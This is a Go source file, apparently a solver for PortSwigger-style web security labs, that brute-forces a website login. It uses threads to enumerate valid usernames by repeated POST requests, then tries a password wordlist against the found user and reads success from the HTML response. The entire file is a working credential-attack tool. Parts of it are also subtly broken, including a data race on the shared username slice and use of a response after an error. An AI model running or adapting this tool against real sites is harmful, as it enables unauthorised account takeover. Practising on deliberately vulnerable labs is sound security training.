package bruteforcer

import (
	"errors"
	"fmt"
	"log"
	htmlparse "portswinger/brute/htmlParse"
	postcalls "portswinger/brute/postCalls"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/html"
)

func BruteForcer(urlPost string, usernames []byte, passwords []byte, threads *int) {
	var (
		index            int = 0
		splitedUsernames []string
		// splitedPasswords []string
		wg sync.WaitGroup
	)

	fmt.Println("Initiating brute Force Attack |-_-|")

	//Spliting usernames to threads
	useranmeSplit := len(strings.Split(string(usernames), "\n")) / *threads

	/**************** Find UserName ******************/

	foundUser := ""

	//Split usernames
	for i := 0; i < *threads; i++ {
		for j := index; j < index+useranmeSplit; j++ {
			splitedUsernames = append(splitedUsernames, strings.Split(string(usernames), "\n")[j])
		}

		//Initiate goroutines
		index += useranmeSplit
		wg.Add(1)
		go func() {
			defer wg.Done()
			err := findUsername(urlPost, splitedUsernames, &foundUser)
			if err != nil {
				log.Fatal(err)
			}
		}()

		time.Sleep(100 * time.Millisecond)
		splitedUsernames = []string{}

	}

	//Taking rest of Strings
	if restOfStrings := len(strings.Split(string(usernames), "\n")) % *threads; restOfStrings != 0 {
		for j := index; j < index+restOfStrings; j++ {
			splitedUsernames = append(splitedUsernames, strings.Split(string(usernames), "\n")[j])
		}

		index += restOfStrings

		//Initiate goroutines for the rest of strings
		wg.Add(1)
		go func() {
			defer wg.Done()
			err := findUsername(urlPost, splitedUsernames, &foundUser)
			if err != nil {
				log.Fatal(err)
			}

		}()

	}

	wg.Wait()

	fmt.Println("User Found", foundUser)

	/**************** Find Password ******************/
	fmt.Println("Initiating Password brute Force Attack |-_-|")

	index = 0
	foundPassword := ""

	if err := findPassword(urlPost, &foundUser, &foundPassword, strings.Split(string(passwords), "\n")); err != nil {
		fmt.Println(err)
		return
	} else {
		fmt.Println("Credentials Found", foundUser, foundPassword)
	}
}

func findUsername(urlPost string, usernames []string, foundUser *string) error {
	password := "testpass"

	for _, username := range usernames {
		for i := 0; i < 4; i++ {
			response, err := postcalls.PostCall(urlPost, username, password)

			if err != nil {
				log.Println(err)
			}

			fmt.Println("username:", username, "password:", password, "HTTP:", response.StatusCode)

			node, err := html.Parse(response.Body)
			if err != nil {
				fmt.Println(err)
			}

			htmlparse.HtmlTraversal(node, username, foundUser)
		}
	}

	return nil
}

func findPassword(urlPost string, username *string, foundPassword *string, passwords []string) error {

	for _, password := range passwords {

		response, err := postcalls.PostCall(urlPost, *username, password)

		if err != nil {
			log.Println(err)
		}

		fmt.Println("username:", *username, "password:", password, "HTTP:", response.StatusCode)

		node, err := html.Parse(response.Body)
		if err != nil {
			fmt.Println(err)
		}

		htmlparse.HtmlTraversalPassword(node, &password, foundPassword)
		if !strings.Contains(*foundPassword, "is-warning") {
			*foundPassword = password
			return nil
		}

		*foundPassword = ""
		fmt.Println("Body Cache Emptied", *foundPassword)
	}

	return errors.New("no Credentials where found")
}
